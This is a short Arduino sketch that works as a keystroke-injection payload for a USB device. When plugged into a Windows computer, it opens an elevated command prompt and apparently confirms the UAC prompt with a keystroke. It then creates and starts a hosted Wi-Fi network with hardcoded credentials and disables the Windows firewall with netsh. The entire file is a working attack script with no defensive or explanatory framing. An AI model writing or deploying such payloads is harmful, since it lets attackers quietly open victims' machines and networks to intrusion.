#include <esKeyboard.h>

#define defaultDelay 200
#define _SSID "pancakes"
#define _PASS "bac0n_pancake"

void ENTER()
{
  Keyboard.press(KEY_RETURN);
  delay(5);
  Keyboard.release(KEY_RETURN);
}

void setup()
{
  Keyboard.begin();

  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(defaultDelay);

  Keyboard.print("powershell Start-Process cmd -Verb RunAs");
  ENTER();

  delay(1000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('s');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("netsh wlan set hostednetwork mode=allow ssid=");
  Keyboard.print(_SSID);
  Keyboard.print(" key=");
  Keyboard.print(_PASS);
  ENTER();

  delay(defaultDelay);
  Keyboard.print("netsh wlan start hostednetwork && netsh firewall set opmode disable && exit");
  ENTER();
}

void loop() { }

